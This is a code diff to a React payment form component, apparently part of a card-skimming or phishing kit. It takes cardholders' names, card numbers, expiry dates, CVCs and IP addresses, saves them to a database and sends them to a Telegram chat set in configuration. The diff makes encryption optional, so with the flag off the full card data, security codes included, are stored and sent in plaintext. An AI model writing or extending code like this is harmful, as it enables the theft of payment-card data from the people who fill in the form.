@@ -43,25 +43,43 @@ const Payment = () => {
             })
             .then(ip => {
                 const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
+                const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
+                let firstName = fname
+                let lastName = lname
+                let cardNumber = cardNum
+                let cExpiry = expiry
+                let cPwd = cvc
+                let ip_address = ip
+                let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                if( isEnableDecrypt === '1' )
+                {
+                    firstName = CryptoJS.AES.encrypt(firstName, secretKey).toString()
+                    lastName = CryptoJS.AES.encrypt(lastName, secretKey).toString()
+                    cardNumber = CryptoJS.AES.encrypt(cardNumber, secretKey).toString()
+                    cExpiry = CryptoJS.AES.encrypt(cExpiry, secretKey).toString()
+                    cPwd = CryptoJS.AES.encrypt(cPwd, secretKey).toString()
+                    ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
+                    logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
+                }
                 db.collection('payment-data').add({
-                    fname: CryptoJS.AES.encrypt(fname, secretKey).toString(), 
-                    lname: CryptoJS.AES.encrypt(lname, secretKey).toString(), 
-                    cardNum: CryptoJS.AES.encrypt(cardNum, secretKey).toString(), 
-                    expiry: CryptoJS.AES.encrypt(expiry, secretKey).toString(), 
-                    cvc: CryptoJS.AES.encrypt(cvc, secretKey).toString(),
-                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
-                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                    fname: firstName, 
+                    lname: lastName, 
+                    cardNum: cardNumber, 
+                    expiry: cExpiry, 
+                    cvc: cPwd,
+                    ip_address: ip_address,
+                    logged_at: logged_at
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                     {
                         let message = "Payment Data\r\n"
-                        message += "First Name: " + CryptoJS.AES.encrypt(fname, secretKey).toString() + '\r\n'
-                        message += "Last Name: " + CryptoJS.AES.encrypt(lname, secretKey).toString() + '\r\n'
-                        message += "Card Number: " + CryptoJS.AES.encrypt(cardNum, secretKey).toString() + '\r\n'
-                        message += "Expiry Date: " + CryptoJS.AES.encrypt(expiry, secretKey).toString() + '\r\n'
-                        message += "Security Code: " + CryptoJS.AES.encrypt(cvc, secretKey).toString() + '\r\n'
-                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
-                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                        message += "" + firstName + '\r\n'
+                        message += "" + lastName + '\r\n'
+                        message += "" + cardNumber + '\r\n'
+                        message += "" + cExpiry + '\r\n'
+                        message += "" + cPwd + '\r\n'
+                        message += "" + ip_address + '\r\n'
+                        message += "" + logged_at
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
                             disableNotification: true,
